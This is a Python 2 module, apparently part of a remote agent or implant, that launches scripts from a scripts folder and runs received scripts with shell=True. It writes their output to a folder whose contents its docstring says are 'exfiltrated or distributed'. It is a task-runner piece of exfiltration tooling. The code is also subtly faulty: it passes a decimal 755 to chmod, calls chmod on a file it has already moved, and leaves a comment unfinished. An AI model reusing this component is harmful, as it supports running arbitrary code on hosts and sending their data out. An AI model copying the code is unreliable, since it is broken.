'''
This class handles external manangement tasks, mostly around launching scripts.

@author JoinEngine
'''
import os
from os.path import isfile, join
import definitions
from definitions import vprint #probably will remove this at some point
import subprocess
from time import sleep, time

'''
'Loads all the scripts in the scripts folder and starts them all. Scripts are 
'expected to take some form of action and produce results in the output folder
'which are then read in and exfiltrated or distributed as needed
'''
def startScripts():
	
	scriptsPath=os.path.join(os.getcwd(), definitions.SCRIPTS_PATH)
	scripts = [file for file in os.listdir(scriptsPath) if isfile(join(scriptsPath, file))]
	
	for i in xrange (0, len(scripts)):
		outputPath=os.path.join(os.getcwd(), definitions.OUTPUT_PATH)
		fullPath=os.path.join(scriptsPath, scripts[i])
		identifier=repr(time())+str(scripts[i])

		#recurring scripts, you are expected to make write to the output folder on your own. This is so we can loop them without causing issues with sending half stdoutputs
		#most likely these will be called from the scripts folder regularly. New scripts will be stored and launched upon arrival with 
		subprocess.Popen([fullPath], shell=True)

'''
'A helper method to launch received scripts. 
'''
def launchScript(script, delete):
	fullPath=os.path.join(os.getcwd(), script)
	outputPath=os.path.join(os.getcwd(), definitions.OUTPUT_PATH)

	scriptsPath=os.path.join(os.getcwd(), definitions.SCRIPTS_PATH)
	scriptsPath=os.path.join(scriptsPath, script)
	
	identifier=repr(time())

	#if it is a one-time run (non looping) call it, write output out, delete it
	#if it is a multi call, copy it to the scripts folder and launch it
	if (delete):
		f=open(os.path.join(outputPath, identifier), "w")
		os.chmod(fullPath, 755)
		subprocess.call(fullPath, shell=True, stdout=f)
		f.close()
		os.remove(fullPath)
	else:
		os.rename(fullPath,scriptsPath)
		os.chmod(fullPath, 755)
		subprocess.Popen([scriptsPath], shell=True)
		






